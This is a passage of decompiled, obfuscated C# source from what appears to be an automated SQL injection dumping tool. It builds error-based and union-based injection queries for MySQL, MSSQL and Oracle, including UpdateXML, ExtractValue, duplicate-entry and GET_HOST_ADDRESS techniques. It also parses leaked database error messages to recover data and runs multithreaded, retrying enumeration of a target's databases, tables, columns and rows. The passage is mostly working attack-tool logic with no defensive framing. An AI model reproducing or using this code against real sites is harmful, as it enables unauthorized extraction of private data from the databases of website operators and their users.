			Conversions.ToBoolean(method_7(chkDumpFieldByField));
			int num = Conversions.ToInteger(method_7(numLimitX));
			int int_ = 1;
			int num2 = Conversions.ToInteger(method_7(numLimitMax));
			_ = 1;
			_ = 0;
			threadPool_0 = new ThreadPool(1);
			bool flag = default(bool);
			if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(method_7(chkAllInOneRequest), types_0 == Types.MySQL_No_Error), enum5_0 != Enum5.const_4), enum5_0 != Enum5.const_5), enum5_0 != Enum5.const_6)))
			{
				flag = true;
			}
			method_9();
			int num3;
			if ((num2 == 1) | ((enum5_0 == Enum5.const_0) | (enum5_0 == Enum5.const_7) | (enum5_0 == Enum5.const_8)) | ((enum5_0 == Enum5.const_6) & ((enum4_0 == Enum4.const_0) | (enum4_0 == Enum4.const_1) | (enum4_0 == Enum4.const_3) | (enum4_0 == Enum4.const_5))))
			{
				int_2 = 1;
			}
			else
			{
				dumpLoading_0.method_1(ProgressBarStyle.Marquee);
				UpDateStatus(Globals.translate_0.GetStr(this, 21));
				if (enum5_0 == Enum5.const_5)
				{
					if (!class45_0.method_0(0).Query.ToLower().Contains("[x]"))
					{
						int_2 = 1;
					}
					else
					{
						int_2 = method_19(Schema.ROWS, "", "", ref string_);
						enum4_0 = Enum4.const_5;
					}
				}
				else
				{
					if (enum5_0 != Enum5.const_6)
					{
						bool flag2 = Conversions.ToBoolean(method_7(chkDumpWhere));
						switch (enum5_0)
						{
						case Enum5.const_1:
							int.TryParse(Conversions.ToString(method_7(lblCountBDs)), out int_2);
							if ((int_2 <= 0 || flag2) && !flag2)
							{
								method_8(lblCountBDs, int_2.ToString());
							}
							enum4_0 = Enum4.const_0;
							goto IL_0439;
						case Enum5.const_2:
							int_2 = method_44(Schema.DATABASES, class45_0.method_0(0).DataBase);
							if ((int_2 <= 0 || flag2) && !flag2)
							{
								method_43(Schema.DATABASES, class45_0.method_0(0).DataBase, "", "", int_2.ToString());
							}
							enum4_0 = Enum4.const_1;
							goto IL_0439;
						case Enum5.const_3:
							int_2 = method_44(Schema.TABLES, class45_0.method_0(0).DataBase, class45_0.method_0(0).Table);
							if ((int_2 <= 0 || flag2) && !flag2)
							{
								method_43(Schema.TABLES, class45_0.method_0(0).DataBase, class45_0.method_0(0).Table, "", int_2.ToString());
							}
							enum4_0 = Enum4.const_3;
							goto IL_0439;
						case Enum5.const_4:
							int_2 = method_44(Schema.ROWS, class45_0.method_0(0).DataBase, class45_0.method_0(0).Table);
							if (int_2 <= 0 || flag2)
							{
								enum4_0 = Enum4.const_5;
								if (!flag2)
								{
									method_43(Schema.TABLES, class45_0.method_0(0).DataBase, class45_0.method_0(0).Table, "", "", int_2.ToString());
								}
							}
							enum4_0 = Enum4.const_5;
							goto IL_0439;
						default:
							Interaction.MsgBox("FIX ME");
							return;
						case Enum5.const_9:
							break;
							IL_0439:
							if (enum4_0 != Enum4.const_7)
							{
								Thread thread = new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
								{
									method_24((Class47)object_0);
								});
								Class47 @class = new Class47(thread, 0, 0);
								Enum5 @enum = enum5_0;
								if (@enum != Enum5.const_1)
								{
									@class.DataBase = class45_0.method_0(0).DataBase;
									@class.Table = class45_0.method_0(0).Table;
									@class.Columns = class45_0.method_0(0).Columns;
								}
								thread.Start(@class);
								threadPool_0.Open(thread);
								while (!WorkedRequestStop() && threadPool_0.ThreadCount != 0)
								{
									Thread.Sleep(100);
								}
							}
							if (num > 1)
							{
								checked
								{
									int_2 -= num;
								}
							}
							goto IL_0510;
						}
						num3 = 1;
						Analyzer analyzer = new Analyzer(Conversions.ToString(method_7(txtURL)), 1, new HTTPExt(bFullIsolated: true));
						DataSearch dataSearch = new DataSearch(Conversions.ToString(method_7(txtURL)), analyzer, IsDumper: true);
						analyzer.DBType = types_0;
						if (analyzer.CheckVersionNoCollactions(Conversions.ToString(method_7(txtURL))))
						{
							dataSearch.CurrentDB = !Conversions.ToBoolean(method_7(chkSearchColumnAllDBs));
							dataSearch.OnDataChanged += method_159;
							if (dataSearch.SearchColumn(string_8) == 0)
							{
								method_159(Globals.translate_0.GetStr(this, 22));
							}
							else
							{
								method_159("\r\n[ " + string_8 + " ] " + Globals.translate_0.GetStr(Class2.Class3_0.SearchColumn_0.Name, "mnuRowsCount") + " " + Globals.FormatNumbers(dataSearch.RowsCount, bIgnoreZero: false));
							}
						}
						else
						{
							method_159(Globals.translate_0.GetStr(Globals.GMain, 88));
						}
						e.Result = Globals.translate_0.GetStr(this, 28).Trim();
						goto IL_0ed1;
					}
					int_2 = class45_0.method_0(0).Columns.Count;
				}
			}
			goto IL_0528;
			IL_0ed1:
			if (threadPool_0 != null)
			{
				threadPool_0.AllJobsPushed();
			}
			return;
			IL_0510:
			if (!(WorkedRequestStop() | (int_2 <= 0)))
			{
				goto IL_0528;
			}
			goto IL_0ed1;
			IL_0528:
			if (int_2 > 1 && method_10())
			{
				int_2 = checked((int)Math.Round(Math.Round((double)int_2 / (double)int_1, 0)));
			}
			if (int_2 <= 0)
			{
				Interaction.Beep();
				if (string.IsNullOrEmpty(string_))
				{
					e.Result = Globals.translate_0.GetStr(this, 22);
				}
				else
				{
					e.Result = string_;
				}
				return;
			}
			if (num2 == 0)
			{
				method_8(numLimitMax, int_2);
			}
			int num4;
			if (flag || num2 == 1)
			{
				num4 = 1;
				num3 = 1;
			}
			else
			{
				num4 = int_2;
				num3 = (Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectGreater(int_2, method_7(numThreads), TextCompare: false)) && Conversions.ToBoolean(method_7(chkThreads))) ? Conversions.ToInteger(method_7(numThreads)) : ((!Conversions.ToBoolean(method_7(chkThreads))) ? 1 : int_2));
			}
			dumpLoading_0.method_1(ProgressBarStyle.Blocks);
			if (Class54.smethod_11(types_0) & (enum5_0 == Enum5.const_1))
			{
				num3 = 1;
			}
			if ((num4 > 1) & (int_2 != 32767))
			{
				dumpLoading_0.method_1(ProgressBarStyle.Blocks);
			}
			else
			{
				dumpLoading_0.method_1(ProgressBarStyle.Marquee);
			}
			class44_0.AffectedRows = int_2;
			threadPool_0 = new ThreadPool(num3);
			Dictionary<int, int> dictionary = new Dictionary<int, int>();
			checked
			{
				while (true)
				{
					int num5 = num4 - 1;
					for (int i = 0; i <= num5; i++)
					{
						num2 = Conversions.ToInteger(method_7(numLimitMax));
						if (num2 <= 0 || i < num2)
						{
							if (!WorkedRequestStop())
							{
								if (!WorkedRequestRetryExceeded(0))
								{
									if (dictionary.Count == 0)
									{
										if (!flag & (int_2 != 32767))
										{
											int percentProgress = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)num4));
											bckWorker.ReportProgress(percentProgress, "");
											UpDateStatus("[" + Strings.FormatNumber(i + 1, 0) + "/" + Strings.FormatNumber(num4, 0) + "] " + string_4);
										}
										else
										{
											bckWorker.ReportProgress(-1, "");
											UpDateStatus("[" + Strings.FormatNumber(i + 1, 0) + "] " + string_4);
										}
									}
									else
									{
										dumpLoading_0.method_1(ProgressBarStyle.Marquee);
										bckWorker.ReportProgress(-1, "");
										UpDateStatus("[" + Strings.FormatNumber(i + 1, 0) + "/" + Strings.FormatNumber(dictionary.Count, 0) + "] " + string_4 + " " + Globals.translate_0.GetStr(this, 24));
									}
									Thread thread = (((enum5_0 == Enum5.const_4) | (enum5_0 == Enum5.const_5)) ? new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_22((Class47)object_0);
									}) : ((enum5_0 == Enum5.const_0) ? new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_23((Class47)object_0);
									}) : ((enum5_0 == Enum5.const_6) ? new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_24((Class47)object_0);
									}) : ((!((enum5_0 == Enum5.const_7) | (enum5_0 == Enum5.const_8))) ? new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_21((Class47)object_0);
									}) : new Thread([SpecialName] [DebuggerHidden] (object object_0) =>
									{
										method_25((Class47)object_0);
									})))));
									thread.Name = "Pos : " + i;
									if (flag & !((enum5_0 == Enum5.const_4) | (enum5_0 == Enum5.const_5)))
									{
										num = -1;
										int_ = 1;
									}
									Class47 class2;
									if (dictionary.Count == 0)
									{
										class2 = new Class47(thread, num, int_);
										class2.IndexJob = i;
									}
									else
									{
										num = dictionary[i];
										class2 = new Class47(thread, num, int_);
										class2.IndexJob = num;
									}
									class2.TotalThreads = num3;
									class2.TotalJob = num4;
									class2.AfectedRows = int_2;
									if ((enum5_0 != Enum5.const_0) & (enum5_0 != Enum5.const_1) & (enum5_0 != Enum5.const_7) & (enum5_0 != Enum5.const_8))
									{
										class2.DataBase = class45_0.method_0(0).DataBase;
										class2.Table = class45_0.method_0(0).Table;
										class2.Columns = class45_0.method_0(0).Columns;
									}
									thread.Start(class2);
									threadPool_0.Open(thread);
									threadPool_0.WaitForThreads();
									if (!string.IsNullOrEmpty(class2.Err))
									{
										e.Result = class2.Err;
									}
									num++;
									continue;
								}
								e.Result = string_2;
								break;
							}
							e.Result = string_3;
							break;
						}
						e.Result = Globals.translate_0.GetStr(this, 23);
						break;
					}
					if (threadPool_0.Status == ThreadPool.ThreadStatus.Stopped)
					{
						break;
					}
					while (true)
					{
						bckWorker.ReportProgress(-1, "");
						if (num3 > 1)
						{
							if (dictionary.Count == 0)
							{
								UpDateStatus("[" + Globals.FormatNumbers(num4) + " | " + Globals.FormatNumbers(num4) + "](" + Conversions.ToString(threadPool_0.ThreadCount) + ") " + Globals.translate_0.GetStr(this, 25));
							}
							else
							{
								UpDateStatus("[" + Globals.FormatNumbers(num4) + " | " + Globals.FormatNumbers(num4) + "](" + Conversions.ToString(threadPool_0.ThreadCount) + ") " + Globals.translate_0.GetStr(this, 26));
							}
						}
						if (WorkedRequestStop() || threadPool_0.ThreadCount == 0)
						{
							break;
						}
						Thread.Sleep(100);
					}
					if (WorkedRequestStop() || !Conversions.ToBoolean(method_7(chkReDumpFailed)) || !((enum5_0 != Enum5.const_5) & (enum5_0 != Enum5.const_0) & (enum5_0 != Enum5.const_6) & (enum5_0 != Enum5.const_7) & (enum5_0 != Enum5.const_8)) || int_2 == 32767 || class44_0.list_1.Count <= 0)
					{
						break;
					}
					dictionary.Clear();
					int num6 = class44_0.list_1.Count - 1;
					for (int j = 0; j <= num6; j++)
					{
						dictionary.Add(j, class44_0.list_1[j]);
					}
					class44_0.list_1.Clear();
					class44_0.int_0 = 0;
					num4 = dictionary.Count;
				}
				goto IL_0ed1;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException) && !WorkedRequestStop())
			{
				string_ = "Error: " + ex2.StackTrace;
			}
			ProjectData.ClearProjectError();
		}
		finally
		{
			if (string.IsNullOrEmpty(Conversions.ToString(e.Result)) && !string.IsNullOrEmpty(string_))
			{
				e.Result = string_;
			}
			if (bckWorker.CancellationPending)
			{
				e.Result = Globals.translate_0.GetStr(this, 27);
			}
			appDomainControl_0.Terminate();
			appDomainControl_0 = null;
			Globals.ReleaseMemory();
		}
	}

	private void method_12(object sender, ProgressChangedEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 134:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_002c;
						case 5:
							goto IL_0031;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
						case 8:
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0017:
					num = 3;
					dumpLoading_0.method_0(e.ProgressPercentage, ref flag);
					goto IL_002c;
					IL_002c:
					num = 4;
					if (!flag)
					{
						goto end_IL_0001_3;
					}
					goto IL_0031;
					IL_000a:
					num = 2;
					if (dumpLoading_0 == null)
					{
						goto end_IL_0001_3;
					}
					goto IL_0017;
					IL_0031:
					num = 5;
					if (bckWorker.CancellationPending)
					{
						goto end_IL_0001_3;
					}
					break;
					end_IL_0001_2:
					break;
				}
				num = 6;
				bckWorker.CancelAsync();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 134;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_13(object sender, RunWorkerCompletedEventArgs e)
	{
		threadPool_0 = null;
		if (Information.IsNothing(RuntimeHelpers.GetObjectValue(e.Result)))
		{
			method_1(Globals.translate_0.GetStr(this, 28));
		}
		else if (class44_0.AffectedRows == 32767)
		{
			method_1(Globals.translate_0.GetStr(this, 28));
		}
		else
		{
			method_1(e.Result.ToString());
		}
	}

	public bool WorkedRequestRetryExceeded(byte iValue)
	{
		int num = ((!Conversions.ToBoolean(method_7(chkThreads))) ? Conversions.ToInteger(method_7(numMaxRetry)) : Conversions.ToInteger(method_7(numMaxRetryMultiThread)));
		if (iValue >= num)
		{
			bool_3 = true;
		}
		lock (class44_0)
		{
			if (class44_0.int_0 > num)
			{
				bool_3 = true;
			}
		}
		return bool_3;
	}

	public bool WorkedRequestStop()
	{
		if (bckWorker.CancellationPending)
		{
			return true;
		}
		bool result = default(bool);
		lock (bckWorker)
		{
			bckWorker.ReportProgress(-1, "");
			if (bckWorker.CancellationPending)
			{
				if (threadPool_0 != null)
				{
					threadPool_0.AbortThreads();
				}
				result = true;
			}
		}
		if (threadPool_0 != null)
		{
			lock (threadPool_0)
			{
				if (threadPool_0.Status == ThreadPool.ThreadStatus.Stopped)
				{
					result = true;
				}
			}
		}
		if (threadPool_0 != null && dumpLoading_0.Boolean_1)
		{
			threadPool_0.Paused = true;
			Globals.G_Taskbar.SetProgressState(ProgressBarState.Paused);
			while (dumpLoading_0.Boolean_1)
			{
				Thread.Sleep(100);
				Application.DoEvents();
			}
			threadPool_0.Paused = false;
			Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
		}
		return result;
	}

	private MySQLCollactions method_14()
	{
		object left = method_7(cmbMySQLCollations);
		if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
		{
			return MySQLCollactions.None;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
		{
			return MySQLCollactions.UnHex;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
		{
			return MySQLCollactions.Binary;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 3, TextCompare: false))
		{
			return MySQLCollactions.CastAsChar;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 4, TextCompare: false))
		{
			return MySQLCollactions.Compress;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 5, TextCompare: false))
		{
			return MySQLCollactions.ConvertUtf8;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 6, TextCompare: false))
		{
			return MySQLCollactions.ConvertLatin1;
		}
		if (Operators.ConditionalCompareObjectEqual(left, 7, TextCompare: false))
		{
			return MySQLCollactions.Aes_descrypt;
		}
		MySQLCollactions result = default(MySQLCollactions);
		return result;
	}

	private void method_15(ref string string_9)
	{
		if (!string.IsNullOrEmpty(string_9))
		{
			string_9 = string_9.Replace("\r\n\r\n", "\r\n");
			string_9 = string_9.Replace("\r\n", " ");
			string_9 = string_9.Replace("\t", " ");
			string_9 = string_9.Replace("  ", " ");
			if (!Class54.smethod_11(types_0))
			{
				string_9 = string_9.Replace(" ,", "");
			}
			string_9 = string_9.Trim();
		}
	}

	private bool method_16(ref string string_9)
	{
		int num = Conversions.ToInteger(method_7(numMaxRetry));
		Conversions.ToInteger(method_7(numSleep));
		int num2 = default(int);
		while (!WorkedRequestStop())
		{
			UpDateStatus(string_4 + " " + Globals.translate_0.GetStr(this, 29));
			string string_10 = class45_0.method_0(0).Columns[0] + " " + class45_0.method_0(0).Query;
			HTTPExt httpext_ = null;
			string value = method_26(ref string_10, ref string_9, ref httpext_);
			if (string.IsNullOrEmpty(value))
			{
				if (num2 < num)
				{
					num2 = checked(num2 + 1);
					continue;
				}
				string_9 = Globals.translate_0.GetStr(this, 30);
				break;
			}
			return true;
		}
		bool result = default(bool);
		return result;
	}

	internal List<string> method_17(string string_9, Types types_1 = Types.None, bool bool_6 = false)
	{
		List<string> list = new List<string>();
		checked
		{
			try
			{
				string text = "";
				if (types_1 == Types.None)
				{
					types_1 = types_0;
				}
				if (Conversions.ToBoolean(Operators.AndObject(types_1 == Types.MySQL_With_Error, Operators.OrObject(bool_6, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 0, TextCompare: false)))))
				{
					int num = string_9.ToLower().IndexOf("Duplicate entry".ToLower());
					if (num >= 0)
					{
						string_9 = string_9.Substring(num);
						text = string_9.Substring(string_9.IndexOf("'") + 1);
						if (text.ToLower().StartsWith(Class54.string_0.ToLower()))
						{
							text = text.Substring(Class54.string_0.Length);
							text = text.Substring(0, text.IndexOf("'"));
						}
						else
						{
							text = Strings.Split(text, Class54.string_0)[0];
						}
					}
					else
					{
						num = string_9.ToLower().IndexOf(Class54.string_0.ToLower());
						if (num > 0)
						{
							text = string_9.Substring(num + Class54.string_0.Length);
						}
					}
					if ((text.ToLower().IndexOf("for key".ToLower()) > 1) & (text.IndexOf("'") > 1))
					{
						text = text.Substring(0, text.ToLower().IndexOf("for key"));
						text = text.Substring(0, text.LastIndexOf("'"));
					}
					if (text.ToLower().IndexOf(Class54.string_0.ToLower()) > 0)
					{
						text = ((!text.ToLower().StartsWith(Class54.string_0.ToLower())) ? Strings.Split(text, Class54.string_0)[0] : Strings.Split(text, Class54.string_0)[1]);
					}
					if (text.EndsWith("'11"))
					{
						text = text.Substring(0, text.Length - 3);
					}
					else if (text.EndsWith("'1"))
					{
						text = text.Substring(0, text.Length - 2);
					}
				}
				else
				{
					if (method_10())
					{
						RegExp regExp = new RegExp();
						Hashtable data = regExp.GetData(string_9, Class54.string_0 + "(.+)" + Class54.string_0);
						Hashtable hashtable = new Hashtable();
						foreach (object value in data.Values)
						{
							string text2 = Conversions.ToString(value);
							string[] array = (text2.Contains(Class54.string_0) ? Strings.Split(text2, Class54.string_0) : new string[1] { text2 });
							string[] array2 = array;
							foreach (string text3 in array2)
							{
								if (text3.Contains(Class54.string_2) && !hashtable.Contains(text3))
								{
									hashtable.Add(text3, text3);
								}
							}
						}
						foreach (object value2 in hashtable.Values)
						{
							string item = Conversions.ToString(value2);
							if (!list.Contains(item))
							{
								list.Add(item);
							}
							if (list.Count >= int_1)
							{
								break;
							}
						}
						foreach (object value3 in hashtable.Values)
						{
							string item2 = Conversions.ToString(value3);
							if (list.Count < int_1)
							{
								list.Add(item2);
								continue;
							}
							break;
						}
						if (list.Count != 0)
						{
							return list;
						}
					}
					int num = string_9.IndexOf(Class54.string_0);
					if (num >= 0)
					{
						text = string_9.Substring(num + Class54.string_0.Length);
						if (text.StartsWith(Class54.string_0))
						{
							text = " ";
						}
						else
						{
							num = text.IndexOf(Class54.string_0);
							if (num > 0)
							{
								text = text.Substring(0, num);
							}
							else
							{
								int[] array3 = new int[3]
								{
									text.IndexOf('<'),
									text.IndexOf('>'),
									text.IndexOf('"')
								};
								num = text.Length;
								int[] array4 = array3;
								foreach (int num2 in array4)
								{
									if (unchecked(num > num2 && num2 > 0))
									{
										num = num2;
									}
								}
								text = text.Substring(0, num);
							}
						}
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject((types_1 == Types.MySQL_No_Error) & ((enum5_0 == Enum5.const_1) | (enum5_0 == Enum5.const_2) | (enum5_0 == Enum5.const_3)), method_7(chkAllInOneRequest)), text.Contains(","))))
					{
						string[] array5 = Strings.Split(text, ",");
						int num3 = array5.Length - 1;
						int num4 = default(int);
						for (int k = 0; k <= num3; k++)
						{
							bool flag;
							if ((flag = true) == array5[k].Contains("<"))
							{
								break;
							}
							if (flag == array5[k].Contains(">"))
							{
								break;
							}
							if (flag == array5[k].Contains(" "))
							{
								break;
							}
							if (flag == array5[k].Contains("\""))
							{
								break;
							}
							if (flag == array5[k].Contains("."))
							{
								break;
							}
							if (flag == array5[k].Contains("/"))
							{
								break;
							}
							if (flag == array5[k].Contains("\\"))
							{
								break;
							}
							if (flag == string.IsNullOrEmpty(array5[k]))
							{
								break;
							}
							num4 = k;
						}
						int num5 = num4;
						for (int l = 0; l <= num5; l++)
						{
							list.Add(array5[l].Trim());
						}
					}
					else
					{
						list.Add(text.Trim());
					}
					if (Class54.smethod_10(types_1))
					{
						int num6 = list.Count - 1;
						for (int m = 0; m <= num6; m++)
						{
							text = list[m];
							if (text.Contains("' to a column of data type int."))
							{
								text = text.Replace("' to a column of data type int.", "");
								list[m] = text;
							}
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return list;
		}
	}

	private string method_18(Schema schema_0, string string_9, string string_10, List<string> list_2, int int_3, int int_4, string string_11, string string_12, ref string string_13, Class47 class47_0 = null, int int_5 = -1)
	{
		string text = "[t]";
		bool bIFNULL = Conversions.ToBoolean(method_7(chkDumpIFNULL));
		bool bHexEncoded = default(bool);
		if ((types_0 == Types.MySQL_No_Error) | (types_0 == Types.MySQL_With_Error))
		{
			bHexEncoded = Conversions.ToBoolean(method_7(chkDumpEncodedHex));
		}
		MySQLErrorType oType = default(MySQLErrorType);
		OracleErrorType bError = default(OracleErrorType);
		if (types_0 == Types.MySQL_With_Error)
		{
			object left = method_7(cmbMySQLErrType);
			if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
			{
				oType = MySQLErrorType.UpdateXML;
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
			{
				oType = MySQLErrorType.DuplicateEntry;
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
			{
				oType = MySQLErrorType.ExtractValue;
			}
		}
		else if (types_0 == Types.Oracle_With_Error)
		{
			bool flag;
			if ((flag = true) == (types_0 == Types.Oracle_No_Error))
			{
				bError = OracleErrorType.NONE;
			}
			else if (Operators.ConditionalCompareObjectEqual(flag, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 0, TextCompare: false), TextCompare: false))
			{
				bError = OracleErrorType.GET_HOST_ADDRESS;
			}
			else if (Operators.ConditionalCompareObjectEqual(flag, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 1, TextCompare: false), TextCompare: false))
			{
				bError = OracleErrorType.DRITHSX_SN;
			}
			else if (Operators.ConditionalCompareObjectEqual(flag, Operators.CompareObjectEqual(method_7(cmbOracleErrType), 2, TextCompare: false), TextCompare: false))
			{
				bError = OracleErrorType.GETMAPPINGXPATH;
			}
		}
		checked
		{
			switch (types_0)
			{
			case Types.MySQL_No_Error:
				switch (schema_0)
				{
				case Schema.INFO:
					text = MySQLNoError.Info(text, method_14(), bHexEncoded, list_2);
					break;
				case Schema.DATABASES:
					text = MySQLNoError.DataBases(text, method_14(), bHexEncoded, bCorrentDB: false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.TABLES:
					text = MySQLNoError.Tables(text, method_14(), string_9, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.COLUMNS:
					text = MySQLNoError.Columns(text, method_14(), string_9, string_10, bDataType: false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.ROWS:
					if (method_10())
					{
						text = string_5;
						int num2 = int_1 - 1;
						for (int j = 0; j <= num2; j++)
						{
							string sTraject2 = "[t]";
							sTraject2 = ((enum5_0 == Enum5.const_5) ? MySQLNoError.Dump(sTraject2, method_14(), bHexEncoded, bIFNULL, "", "", list_2, int_1 * int_3 + j, int_4, "", "", "", class45_0.method_0(0).Query) : MySQLNoError.Dump(sTraject2, method_14(), bHexEncoded, bIFNULL, string_9, string_10, list_2, int_1 * int_3 + j, int_4, string_11, string_12));
							text = ((j != 0) ? text.Replace("[t" + Conversions.ToString(j), sTraject2) : text.Replace("[t]", sTraject2));
						}
					}
					else
					{
						text = ((enum5_0 == Enum5.const_5) ? MySQLNoError.Dump(text, method_14(), bHexEncoded, bIFNULL, "", "", list_2, int_3, int_4, "", "", "", class45_0.method_0(0).Query) : MySQLNoError.Dump(text, method_14(), bHexEncoded, bIFNULL, string_9, string_10, list_2, int_3, int_4, string_11, string_12));
					}
					break;
				}
				break;
			case Types.MySQL_With_Error:
				switch (schema_0)
				{
				case Schema.INFO:
					text = MySQLWithError.Info(text, method_14(), oType, list_2);
					break;
				case Schema.DATABASES:
					text = MySQLWithError.DataBases(text, method_14(), oType, bCorrentDB: false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.TABLES:
					text = MySQLWithError.Tables(text, method_14(), oType, string_9, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.COLUMNS:
					text = MySQLWithError.Columns(text, method_14(), oType, string_9, string_10, bDataType: false, string_11, string_12, "", int_3, int_4);
					break;
				case Schema.ROWS:
					text = ((enum5_0 == Enum5.const_5) ? MySQLWithError.Dump(text, method_14(), oType, bIFNULL, "", "", list_2, int_3, int_4, "", "", "", class45_0.method_0(0).Query) : MySQLWithError.Dump(text, method_14(), oType, bIFNULL, string_9, string_10, list_2, int_3, int_4, "", string_11, string_12));
					break;
				}
				break;
			case Types.MSSQL_No_Error:
			case Types.MSSQL_With_Error:
			{
				bool bCollateLatin = Conversions.ToBoolean(method_7(chkMSSQL_Latin1));
				string sCastType = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(method_7(chkMSSQLCastAsChar)), RuntimeHelpers.GetObjectValue(method_7(cmbMSSQLCast)), ""));
				InjectionType oError = default(InjectionType);
				switch (types_0)
				{
				case Types.MSSQL_With_Error:
					oError = InjectionType.Error;
					break;
				case Types.MSSQL_No_Error:
					oError = InjectionType.Union;
					break;
				}
				switch (schema_0)
				{
				case Schema.INFO:
					text = MSSQL.Info(text, oError, bCollateLatin, list_2, sCastType);
					break;
				case Schema.DATABASES:
					text = MSSQL.DataBases(text, oError, bCorrentDB: false, sCastType, bCollateLatin, int_3, class47_0.AfectedRows, string_11, string_12);
					break;
				case Schema.TABLES:
					text = MSSQL.Tables(text, string_9, oError, sCastType, bCollateLatin, int_3, class47_0.AfectedRows, string_11, string_12);
					break;
				case Schema.COLUMNS:
					text = MSSQL.Columns(text, string_9, string_10, oError, sCastType, bCollateLatin, int_3, class47_0.AfectedRows, string_11, string_12);
					break;
				case Schema.ROWS:
				{
					if (!method_10() || types_0 != Types.MSSQL_No_Error)
					{
						text = ((enum5_0 == Enum5.const_5) ? MSSQL.Dump(text, "", "", list_2, bIFNULL, oError, sCastType, bCollateLatin, int_3, class47_0.AfectedRows, string_11, string_12, "", class45_0.method_0(0).Query) : ((!String_0.Equals(string_9)) ? MSSQL.Dump(text, string_9, string_10, list_2, bIFNULL, oError, sCastType, bCollateLatin, int_3, class47_0.AfectedRows, string_11, string_12, "", "", int_5) : MSSQL.Dump(text, "", string_10, list_2, bIFNULL, oError, sCastType, bCollateLatin, int_3, class47_0.AfectedRows, string_11, string_12, "", "", int_5)));
						break;
					}
					text = string_5;
					int num4 = int_1 - 1;
					for (int l = 0; l <= num4; l++)
					{
						string sTraject4 = "[t]";
						sTraject4 = ((enum5_0 == Enum5.const_5) ? MSSQL.Dump(sTraject4, "", "", list_2, bIFNULL, oError, sCastType, bCollateLatin, int_1 * int_3 + l, class47_0.AfectedRows, string_11, string_12, "", class45_0.method_0(0).Query) : ((!String_0.Equals(string_9)) ? MSSQL.Dump(sTraject4, string_9, string_10, list_2, bIFNULL, oError, sCastType, bCollateLatin, int_1 * int_3 + l, class47_0.AfectedRows, string_11, string_12, "", "", int_5) : MSSQL.Dump(sTraject4, "", string_10, list_2, bIFNULL, oError, sCastType, bCollateLatin, int_1 * int_3 + l, class47_0.AfectedRows, string_11, string_12, "", "", int_5)));
						text = ((l != 0) ? text.Replace("[t" + Conversions.ToString(l), sTraject4) : text.Replace("[t]", sTraject4));
					}
					break;
				}
				}
				break;
			}
			case Types.Oracle_No_Error:
			case Types.Oracle_With_Error:
			{
				bool bCastAsChar = Conversions.ToBoolean(method_7(chkOracleCastAsChar));
				InjectionType oMethod2 = default(InjectionType);
				switch (types_0)
				{
				case Types.Oracle_With_Error:
					oMethod2 = InjectionType.Error;
					break;
				case Types.Oracle_No_Error:
					oMethod2 = InjectionType.Union;
					break;
				}
				unchecked
				{
					switch (schema_0)
					{
					case Schema.INFO:
						text = Oracle.Info(text, oMethod2, bError, list_2, bCastAsChar);
						break;
					case Schema.DATABASES:
					{
						List<string> lDBsAdded = method_51();
						text = Oracle.DataBases(text, oMethod2, (MySQLErrorType)bError, bCastAsChar, bCorrentDB: false, string_11, string_12, "", lDBsAdded);
						break;
					}
					case Schema.TABLES:
						text = Oracle.Tables(text, oMethod2, (MySQLErrorType)bError, string_9, bCastAsChar, int_3, string_11, string_12);
						break;
					case Schema.COLUMNS:
						text = Oracle.Columns(text, oMethod2, (MySQLErrorType)bError, string_9, string_10, bCastAsChar, int_3, string_11, string_12);
						break;
					case Schema.ROWS:
					{
						object left2 = method_7(cmbOracleTopN);
						OracleTopN oTopN = default(OracleTopN);
